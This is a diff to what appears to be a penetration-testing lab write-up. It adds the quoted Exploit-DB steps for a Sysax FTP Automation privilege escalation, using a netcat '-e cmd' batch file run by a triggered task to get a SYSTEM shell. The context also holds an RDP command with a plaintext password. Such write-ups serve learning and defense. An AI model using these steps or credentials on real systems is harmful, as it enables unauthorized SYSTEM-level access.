@@ -871,7 +871,38 @@ sudo proxychains xfreerdp /v:172.16.8.50 /u:ilfserveradm /p:Sys26Admin /drive:/h
 ```
 We see that there is a program called Sysax FTP Automation with version 6.90 in Program Files x86 with the following privilege escalation exploit on exploitdb: https://www.exploit-db.com/exploits/50834
 
-We follow the directions in the exploit and eventually get SYSTEM privilege.
+We follow these directions in the exploit and eventually get SYSTEM privilege:
+```
+# Details:
+Sysax Scheduler Service runs as Local System. By default the application allows for low privilege users to create/run backup jobs other than themselves.  By removing the option to run as current user or another, the task will run as System.  A low privilege user could abuse this and escalate their privileges to local system.
+
+# Prerequisites:
+To successfully exploit this vulnerability, an attacker must already have local access to a system running Sysax FTP Automation using a low privileged user account
+
+# Exploit:
+Logged in as low privileged account
+
+1. Create folder c:\temp
+2. Download netcat (nc.exe) to c:\temp
+3. Create file 'pwn.bat' in c:\temp with contents
+	c:\temp\nc.exe localhost 1337 -e cmd
+4. Open command prompt and netcat listener
+	nc -nlvvp 1337
+5. Open sysaxschedscp.exe from C:\Program Files (x86)\SysaxAutomation
+6. Select Setup Scheduled/Triggered Tasks
+	- Add task (Triggered)
+	- Update folder to monitor to be c:\temp
+	- Check 'Run task if a file is added to the monitor folder or subfolder(s)'
+	- Choose 'Run any other Program' and choose c:\temp\pwn.bat
+	- Uncheck 'Login as the following user to run task'
+	- Finish and Save
+7. Create new text file in c:\temp
+8. Check netcat listener
+	C:\WINDOWS\system32>whoami
+	whoami
+	nt authority\system
+```
+
 
 
 
